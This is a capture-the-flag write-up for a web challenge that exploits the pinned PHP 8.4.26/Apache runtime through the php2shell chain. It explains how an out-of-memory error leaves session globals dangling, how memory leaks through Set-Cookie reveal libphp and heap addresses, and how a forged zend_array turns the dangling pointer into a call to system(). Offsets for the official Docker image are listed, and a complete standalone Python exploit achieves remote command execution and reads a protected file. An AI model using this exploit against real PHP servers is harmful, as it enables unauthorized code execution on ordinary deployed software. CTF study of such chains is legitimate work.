---
title: "The Coffee Shop"
category: "Web"
tags: []
solve_date: "2026-11-01"
language: "en"
---

# The Coffee Shop

## Challenge

The storefront is a decoy: the vulnerability is the pinned PHP 8.4.26 / Apache runtime. Using the php2shell OOM / stale-session-globals chain, a dangling `PS(id)` is turned into an out-of-bounds read through `Set-Cookie`, and a dangling `PS(hash_serialize_verifier)` is turned into a fake `zend_array` whose `pDestructor` is `zif_system`, giving command execution. The instancer proxy only forwards a few KB of upstream response headers (4.4 KB was observed to pass; the published 800 KB leak cannot be delivered), so the exploit splits the leak into two 4 KB windows (libphp base and Zend MM main-chunk base), then runs A2/B2 and reads the after-hours ledger.

## Analysis

The chain (research by 9bie, `php2shell`) abuses `session.upload_progress`, which initializes a session before RINIT:

- **A1** — a chunked multipart request at `memory_limit=128M` triggers `zend_mm_safe_error()` inside `php_session_send_cookie()` (the `php_url_encode(PS(id))` allocation). The request bails out with `PS(send_cookie)=1` and a dangling `PS(id)` pointing into a cached Zend MM chunk.
- **B1** — a forged `zend_string` header is placed exactly at the dangling `PS(id)` address; `php_url_encode()` then reads `len` bytes of attacker-chosen length and the value is emitted in `Set-Cookie`.
- **A2** — a cheap OOM leaves `PS(hash_serialize_verifier)` dangling.
- **B2** — fake `zend_reference` values overwrite that dangling pointer with a reference to a fake `zend_array`; during request shutdown `zend_hash_destroy()` calls `pDestructor`, which is set to `zif_system` (`/bin/sh -c cmd`).

Offsets used here are for the official `php:8.4.26-apache` image on Debian bookworm:

| symbol | offset |
|---|---|
| `zval_ptr_dtor` | `libphp + 0x65EB60` |
| `zif_system` | `libphp + 0x465370` |
| fake `zend_array` slot | `main + 0xF8398` |
| dangling `PS(hsv)` | `main + 0x7D720` |

## Solution

### 1. Leak libphp and the Zend MM main chunk in two 4 KB windows

The stock `LEAK_SPEC` (`G:511:0x137` × 14, `G:400:0x137`, `G:511:0x137`, `X:900`, `fake_len=0xC8000`) leaks both pointers, but the instancer only forwards ~8 KB of response headers and returns 502 for larger ones. Instead, the forged value is shortened:

- Sixteen multipart fields `f0000…f0015` contain 511-page `'A'` values, except the 15th (`idx=14`), which is **311 pages**.
- The fake `zend_string` header is written at value offset `page*0x1000 - 0x1018`, so when the 311-page value lands at pages 1..0x137 of the cached id chunk, the header is exactly at `chunk+0x137000` — the dangling `PS(id)`.
- Its data pointer is at `chunk+0x137018`; `fake_len=0x1040` reads `0xFE8` bytes of the value allocation (including its NUL terminator) and `0x58` bytes past it into page `0x138`.
- 900 nested fields `xNNNNN[a][a]…` are parsed afterwards; they allocate real HashTables/Buckets in the hole left after the 311-page value.

Two variations of the same body give the two addresses:

- **M leak (no fillers):** the first hole page holds a bucket/arData table. The qword at decoded offset `0x1028` is a `zend_array*` inside the main Zend MM chunk at `main + 0x12DE70`, so `main = q & ~0x1FFFFF`.
- **L leak (200 fillers of 31 bytes):** the 31-byte strings exhaust the 56-byte bin and force the hole's first page to be a page of `zend_array` structs. The qword at decoded offset `0x1018` is `pDestructor = zval_ptr_dtor`, so `libphp = q - 0x65EB60`.

Two practical details matter:

- **Same child.** The instancer reuses upstream connections, but Apache prefork may serve A1 and B1 from different children. Before firing a leak pair, send A1 followed by a tiny session request on the same connection; a `502` on the tiny request proves the stale-state crash path, i.e. the shared child, and only then send the A1+B1 pair on a fresh connection.
- **Address range.** The remote heap/mmap addresses were `0x71df…`, not `0x7f…`; pointer filters must accept `[0x400000000000, 0x800000000000)`.

The pair is valid when `libphp - main` is inside `0x1A00000..0x1F00000`.

### 2. A2/B2 to `system()`

With `libphp` and `main` known:

- `S = main + 0xF8398` is where the fake `zend_array` is placed.
- `zif = libphp + 0x465370` is `zif_system`.

A2 (`880` nested `files[Rxxxxx][a]…` empty file controls, `115` fillers, `PHPSESSID=\x00`) triggers the cheap OOM and leaves `PS(hash_serialize_verifier)` dangling at `main + 0x7D720`.

B2 sprays 384-byte values containing fake `zend_reference` records (refcount 1, type `0x0A`, pointer `S`) around one `ht` part. The `ht` part is a fake `zend_array` at `S` whose `pDestructor` is `zif_system` and whose bucket points to the command string. At shutdown, `zend_hash_destroy()` calls the destructor and the shell command executes.

The first B2 after A2 often kills the child right after executing the command (HTTP 502); the command still runs, so the exploit writes its output into the webroot and the result is fetched with a normal GET. The webroot `/var/www/html` is a symlink to `/tmp/www`.

### 3. Read the ledger

`/usr/local/bin/coffee-entrypoint` writes the platform-provided `$RCTF_FLAG` into `/tmp/ember-oak-private/after-hours-ledger.txt` (mode 0400, owned by `www-data`) at container start. The RCE command copies that file to the webroot, and the flag is returned over HTTP:

```
EMBER & OAK | INTERNAL SHIFT LEDGER
Private: the after-hours roast blend is not for guests.
Master batch authorization: hiCTF{local_development_only_do_not_submit_c22ce82f54}
Signed: head roaster
```

The `_c22ce82f54` suffix is the per-team component; submitting the base flag without it is rejected (`badFlag`), while the full ledger value is accepted (`goodFlag`). The phrase `local_development_only_do_not_submit` is part of the flag text and is a deliberate decoy.

## Reproduce

Save as `solve.py`, set `HOST` to the current instance, and run it. It needs only the Python standard library. The script leaks both addresses, runs A2/B2, then copies the ledger to the webroot and prints the flag.

```python
#!/usr/bin/env python3
# The Coffee Shop - Hidden Investigations CTF
# php2shell chain: OOM -> stale session globals -> two small OOB leaks -> RCE.
import socket, ssl, struct, time, re, urllib.parse

HOST = "the-coffee-shop-XXXXXXXX.chall.hiddeninvestigations.net"
PORT = 443

BOUNDARY = b"C" * 10
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
PAGE = 0x137

# php:8.4.26-apache (Debian bookworm)
ZDTOR_OFF = 0x65EB60   # zval_ptr_dtor
ZIF_OFF = 0x465370     # zif_system
S_OFF = 0xF8398        # fake zend_array in the Zend MM main chunk
DELTA_MIN, DELTA_MAX = 0x1A00000, 0x1F00000

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE  # CTF endpoint uses a wildcard certificate


class Conn:
    def __init__(self):
        raw = socket.create_connection((HOST, PORT), timeout=30)
        self.s = CTX.wrap_socket(raw, server_hostname=HOST)
        self.s.settimeout(180)
        self.buf = b""

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass

    def _more(self):
        chunk = self.s.recv(65536)
        if not chunk:
            raise EOFError
        self.buf += chunk

    def resp(self):
        while b"\r\n\r\n" not in self.buf:
            self._more()
        head, _, self.buf = self.buf.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        status = lines[0]
        hdrs = {}
        for line in lines[1:]:
            key, _, val = line.partition(b":")
            hdrs[key.strip().lower()] = val.strip()
        body = b""
        if b"chunked" in hdrs.get(b"transfer-encoding", b"").lower():
            while True:
                while b"\r\n" not in self.buf:
                    self._more()
                line, _, self.buf = self.buf.partition(b"\r\n")
                size = int(line.split(b";")[0], 16)
                while len(self.buf) < size + 2:
                    self._more()
                body += self.buf[:size]
                self.buf = self.buf[size + 2:]
                if size == 0:
                    break
        elif b"content-length" in hdrs:
            size = int(hdrs[b"content-length"])
            while len(self.buf) < size:
                self._more()
            body, self.buf = self.buf[:size], self.buf[size:]
        else:
            try:
                while True:
                    self._more()
            except EOFError:
                pass
            body, self.buf = self.buf, b""
        return status, hdrs, body

    def send_chunked(self, path, body):
        head = (f"POST {path} HTTP/1.1\r\nHost: {HOST}\r\n"
                f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
                f"Transfer-Encoding: chunked\r\n\r\n").encode()
        out = bytearray(head)
        for i in range(0, len(body), 65536):
            piece = body[i:i + 65536]
            out += ("%x\r\n" % len(piece)).encode() + piece + b"\r\n"
        out += b"0\r\n\r\n"
        self.s.sendall(out)

    def send_plain(self, path, body):
        head = (f"POST {path} HTTP/1.1\r\nHost: {HOST}\r\n"
                f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
                f"Content-Length: {len(body)}\r\n\r\n").encode()
        self.s.sendall(head + body)

    def get(self, path):
        req = (f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\n"
               f"Connection: close\r\n\r\n").encode()
        self.s.sendall(req)
        return self.resp()


def part(name, value=b"", filename=None, ctype=None):
    out = bytearray(b"--" + BOUNDARY +
                    b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out += b"; filename=\"" + filename + b"\""
    out += b"\r\n"
    if ctype is not None:
        out += b"Content-Type: " + ctype + b"\r\n"
    out += b"\r\n" + value + b"\r\n"
    return bytes(out)


def a1_body(parts=860, depth=64, key_pad=90, fillers=14, big=78, big_len=8000,
            burners=20, burner_len=4000, progress_len=4000, sid_hex="00"):
    out = bytearray()
    out += part(b"PHPSESSID", bytes.fromhex(sid_hex))
    for i in range(parts):
        name = (("files[R%05d%s]" % (i, "K" * key_pad)).encode() +
                b"[a]" * (depth - 2))
        ctype = b"C" * 103 if i == 0 else (b"C" * 231 if i == 1
                                           else b"application/octet-stream")
        out += b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\""
        out += name + b"\""
        out += b"; filename=\"" + (b"A" if i < 2 else b"") + b"\""
        out += b"\r\nContent-Type: " + ctype + b"\r\n\r\n"
    for i in range(fillers):
        out += part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        out += part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        out += part(("u%02d" % i).encode(), b"U" * burner_len)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def tag8(idx):
    return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"


def forge(pages, fake_len, idx, page=PAGE):
    length = pages * 4096 - 25
    value = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    struct.pack_into("<I", value, hdr + 0x00, 0)     # refcount 0: not freed
    struct.pack_into("<I", value, hdr + 0x04, 0x16)  # IS_STRING|NOT_COLLECTABLE
    struct.pack_into("<Q", value, hdr + 0x08, 0)     # h
    struct.pack_into("<Q", value, hdr + 0x10, fake_len)
    value[hdr + 0x18:hdr + 0x18 + 8] = tag8(idx)     # '/' -> invalid session key
    return bytes(value)


def b1_body(fake_len, fillers=0, nx=900):
    out = bytearray()
    out += part(b"PHPSESSID", b"a")
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    idx = 0
    for i in range(16):
        pages = 311 if i == 14 else 511
        out += part(("f%04d" % idx).encode().ljust(120, b"f")[:120],
                    forge(pages, fake_len, idx))
        idx += 1
    for k in range(fillers):
        value = ("%06d" % k).encode().ljust(31, b"Q")[:31]
        out += part(("p%05d" % idx).encode(), value)
        idx += 1
    for _ in range(nx):
        out += part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
        idx += 1
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def cookie_leak(hdrs):
    raw = hdrs.get(b"set-cookie", b"")
    match = re.search(rb"PHPSESSID=([^;]*)", raw)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(
        match.group(1).replace(b"+", b"%20").decode("latin1"))


def status_code(status):
    fields = status.split(b" ")
    return fields[1].decode() if len(fields) > 1 else "?"


TINY = (part(b"PHPSESSID", b"a") + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
        + b"--" + BOUNDARY + b"--\r\n")
A1 = a1_body()


def same_child():
    """A1 + tiny session request on one connection; 502 proves the same child."""
    conn = Conn()
    try:
        conn.send_chunked("/index.php" + Q, A1)
        conn.resp()
        time.sleep(0.22)
        conn.send_chunked("/index.php", TINY)
        status, _, _ = conn.resp()
        return status_code(status) == "502"
    except Exception:
        return False
    finally:
        conn.close()


def leak_pair(body):
    conn = Conn()
    try:
        conn.send_chunked("/index.php" + Q, A1)
        conn.resp()
        time.sleep(0.22)
        conn.send_chunked("/index.php", body)
        status, hdrs, _ = conn.resp()
        return status_code(status), cookie_leak(hdrs)
    finally:
        conn.close()


def leak_addresses(deadline=900):
    end = time.time() + deadline
    body_main = b1_body(0x1040, fillers=0)
    body_lib = b1_body(0x1040, fillers=200)
    main = zdtor = None
    while time.time() < end and not (main and zdtor):
        if main is None:
            try:
                if same_child():
                    _, decoded = leak_pair(body_main)
                    if len(decoded) >= 0x1038:
                        ptr = struct.unpack_from("<Q", decoded, 0x1028)[0]
                        if 0x400000000000 <= ptr < 0x800000000000:
                            main = ptr & ~0x1FFFFF
                            print("main  = %#x" % main, flush=True)
            except Exception:
                pass
        if zdtor is None:
            try:
                if same_child():
                    _, decoded = leak_pair(body_lib)
                    if len(decoded) >= 0x1020:
                        ptr = struct.unpack_from("<Q", decoded, 0x1018)[0]
                        if 0x400000000000 <= ptr < 0x800000000000:
                            zdtor = ptr
                            print("zdtor = %#x" % zdtor, flush=True)
            except Exception:
                pass
    if not (main and zdtor):
        raise SystemExit("leak failed; retry (the instance is a 20-minute pod)")
    lib = zdtor - ZDTOR_OFF
    if not (DELTA_MIN <= lib - main <= DELTA_MAX):
        raise SystemExit("implausible libphp-main delta; retry")
    return main, lib


def a2_body(parts=880, depth=64, fillers=115, progress=b"k0"):
    out = bytearray()
    out += part(b"PHPSESSID", b"\x00")
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        out += part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        name = ("files[R%05d]" % i).encode() + b"[a]" * (depth - 2)
        out += b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\""
        out += name + b"\""
        out += b"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n"
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def ht_bytes(S, zif, cmd, size=384):
    ht = bytearray(size)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, S + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)            # pDestructor
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x50, S + 0x80)   # bucket -> command string
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def fake_ref(ptr, rc=1):
    value = bytearray(32)
    struct.pack_into("<I", value, 0, rc)
    value[4] = 0x0A
    struct.pack_into("<Q", value, 8, ptr)
    struct.pack_into("<I", value, 16, 0x0107)
    return bytes(value)


def spray(size, ptr):
    value = bytearray(b"S" * size)
    off = 8
    while off + 32 <= size:
        value[off:off + 32] = fake_ref(ptr)
        off += 32
    return bytes(value)


def b2_body(S, zif, cmd, size=384, n1=500, n2=495, name_len=10):
    ht = ht_bytes(S, zif, cmd)
    refs = spray(size, S)
    out = bytearray()
    for i in range(n1):
        out += part(("s%09d" % i).encode()[:name_len], refs)
    out += part(b"ht", ht)
    out += part(b"PHPSESSID", b"a" * 32)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        out += part(("t%09d" % i).encode()[:name_len], refs)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def exploit(main, lib, deadline=600):
    zif = lib + ZIF_OFF
    S = main + S_OFF
    cmd = (b"cat /tmp/ember-oak-private/after-hours-ledger.txt "
           b"> /var/www/html/o.txt; echo __OK__ >> /var/www/html/o.txt")
    assert len(cmd) <= 225, "command does not fit the fake HashTable bucket"
    a2 = a2_body()
    b2 = b2_body(S, zif, cmd)
    end = time.time() + deadline
    while time.time() < end:
        try:
            conn = Conn()
            conn.send_plain("/index.php", a2)
            conn.resp()
            conn.close()
        except Exception:
            pass
        time.sleep(0.15)
        for _ in range(8):
            try:
                conn = Conn()
                conn.send_plain("/index.php", b2)
                conn.resp()
            except Exception:
                pass
            finally:
                try:
                    conn.close()
                except Exception:
                    pass
            time.sleep(0.12)
        try:
            conn = Conn()
            _, _, body = conn.get("/o.txt")
            conn.close()
            match = re.search(rb"hiCTF\{[^}]+\}", body)
            if match:
                return match.group(0).decode()
        except Exception:
            pass
    return None


if __name__ == "__main__":
    main_addr, lib = leak_addresses()
    print("libphp = %#x" % lib, flush=True)
    flag = exploit(main_addr, lib)
    if not flag:
        raise SystemExit("RCE stage failed; retry the leak and burst")
    print("FLAG:", flag)
```

## Result

```
hiCTF{local_development_only_do_not_submit_c22ce82f54}
```
